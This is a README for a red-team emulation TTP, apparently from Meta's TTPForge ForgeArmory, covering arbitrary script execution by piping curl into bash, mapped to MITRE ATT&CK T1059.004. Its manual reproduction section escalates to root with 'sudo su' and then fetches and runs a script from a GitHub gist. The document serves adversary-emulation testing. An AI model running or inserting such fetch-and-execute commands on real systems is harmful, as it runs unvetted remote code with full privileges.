# Arbitrary Script Execution Using Curl To Pipe

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP enables the execution of an arbitrary bash script from a GitHub gist.

## Arguments

- **escalate_privileges**: Whether to escalate privileges before running the script (default: false).
- **download_link**: The download link for the GitHub gist containing the bash script (default: https://gist.githubusercontent.com/l50/2dd5d552c0336e6e8fd7704fd0d194de/raw/0cd2d4d0be1cac1899fc45ff23df8a1ed9ea0409/gistfile1.txt).

## Pre-requisites

1. The executor must have access to the specified GitHub gist and the ability to execute bash scripts.

## Examples

You can run the TTP using the following example (after updating the arguments):
```bash
ttpforge run forgearmory//exectution/arbitrary-script-execution-using-curl-to-pipe/arbitrary-script-execution-using-curl-to-pipe.yaml \
  --arg escalate_privileges=true
```

## Steps

1. **ensure-root-user-if-required**: This step checks if the TTP needs to be run as root, and exits with an error message if it is not being run as root.
2. **download-and-run-script**: This step downloads the bash script from the specified GitHub gist and executes it. If the script runs successfully, the TTP exits with a success message. Otherwise, it exits with a failure message.

## Manual Reproduction Steps

```
# Escalate privileges to root (optional - depends on what you're running)
sudo su

DOWNLOAD_LINK=https://gist.githubusercontent.com/l50/2dd5d552c0336e6e8fd7704fd0d194de/raw/0cd2d4d0be1cac1899fc45ff23df8a1ed9ea0409/gistfile1.txt

# Grab arbitrary bash script from a github gist and run it
curl -sL "${DOWNLOAD_LINK}" | bash
```

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0002 Execution
- **Techniques**:
  - T1059 Command and Scripting Interpreter
- **Subtechniques**:
  - T1059.004 Command and Scripting Interpreter Unix Shell
